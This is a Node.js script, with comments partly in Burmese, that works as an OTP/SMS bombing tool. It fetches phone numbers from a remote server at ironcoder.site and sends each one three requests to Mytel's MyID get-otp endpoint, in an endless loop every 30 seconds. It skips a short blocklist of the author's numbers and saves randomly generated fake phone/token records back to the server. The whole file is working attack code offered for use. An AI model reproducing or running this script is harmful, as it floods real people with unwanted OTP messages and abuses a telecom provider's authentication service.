const axios = require('axios');

// ⛔ ဒီဖုန်းနံပါတ်တွေကို skip လုပ်မယ်
const blockList = [
  "09687071269",
  "09670871425",
  "09664810586",
  "09681307197"
];

// ✅ Random phone number generator
function randomPhone() {
    const prefix = "096";
    const digits = Math.floor(Math.random() * 1e8).toString().padStart(8, "0");
    return prefix + digits;
}

// ✅ Random token generator
function randomToken(length = 6) {
    const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    let result = "";
    for (let i = 0; i < length; i++) {
        result += chars[Math.floor(Math.random() * chars.length)];
    }
    return result;
}

// ✅ Save to save.php
async function saveUser(phone, token) {
    try {
        const res = await axios.post("https://ironcoder.site/ironmyid/save.php", {
            phone,
            token
        }, {
            headers: { "Content-Type": "application/json" }
        });
        if (res.data.success) {
            console.log(`💾 Saved user ${phone}`);
        } else {
            console.log(`⚠️ Failed to save user: ${res.data.message || "unknown error"}`);
        }
    } catch (e) {
        console.error(`❌ Error saving user ${phone}:`, e.message);
    }
}

// ✅ Fetch from getall.php
async function fetchPhones() {
    try {
        const res = await axios.get("https://ironcoder.site/ironmyid/getall.php");
        if (res.data.success) {
            return res.data.data.map(user => user.phone);
        }
        console.log("❌ No user data");
        return [];
    } catch (e) {
        console.error("❌ Error fetching list:", e.message);
        return [];
    }
}

// ✅ Send 3x OTP to phone
async function sendOtp(phone) {
    for (let i = 0; i < 3; i++) {
        try {
            const url = `https://apis.mytel.com.mm/myid/authen/v1.0/login/method/otp/get-otp?phoneNumber=${phone}`;
            const res = await axios.get(url);
            if (res.status === 200) {
                console.log(`✅ (${i+1}/3) OTP sent to ${phone}`);
            } else {
                console.log(`⚠️ (${i+1}/3) Failed for ${phone} - Status: ${res.status}`);
            }
        } catch (e) {
            console.error(`❌ (${i+1}/3) Error sending to ${phone}:`, e.message);
        }
    }
}

// ✅ 1 Loop: fetch, send OTP, then save random users per phone
async function loopOnce() {
    const phones = await fetchPhones();
    let count = 0;

    for (const phone of phones) {
        if (blockList.includes(phone)) {
            console.log(`⏭ Skipped blocked number: ${phone}`);
            continue;
        }

        await sendOtp(phone);
        count++;

        // ➕ Save a random user each time
        const newPhone = randomPhone();
        const newToken = randomToken();
        await saveUser(newPhone, newToken);
    }

    console.log(`✅ Round complete. Sent OTP to ${count} users (x3 each).\n`);
}

// 🔁 Forever loop
async function loopForever() {
    while (true) {
        await loopOnce();
        console.log("🔁 Waiting 30s before next round...\n");
        await new Promise(r => setTimeout(r, 30000));
    }
}

loopForever();
